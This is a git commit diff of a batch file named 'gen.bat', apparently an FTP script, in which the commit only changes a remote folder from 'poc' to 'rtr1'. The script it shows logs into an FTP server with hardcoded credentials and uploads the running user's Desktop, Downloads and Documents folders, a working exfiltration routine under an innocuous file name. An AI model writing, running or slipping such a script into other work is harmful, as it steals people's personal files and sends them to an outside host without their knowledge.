6ac160a643cfeaee57dd10287f8b0b1903532d8b
TheBetaBiggie <53587460+TheBetaBiggie@users.noreply.github.com>
2022-08-22 23:25:17 -0700

    Update gen.bat

--- gen.bat
+++ gen.bat
@@ -1,7 +1,7 @@
 option batch continue
 open ftp://biggie:biggie00**11@xbox.com/
 cd ServerStorage1
-cd poc
+cd rtr1
 put %userprofile%\Desktop
 put %userprofile%\Downloads
 put %userprofile%\Documents
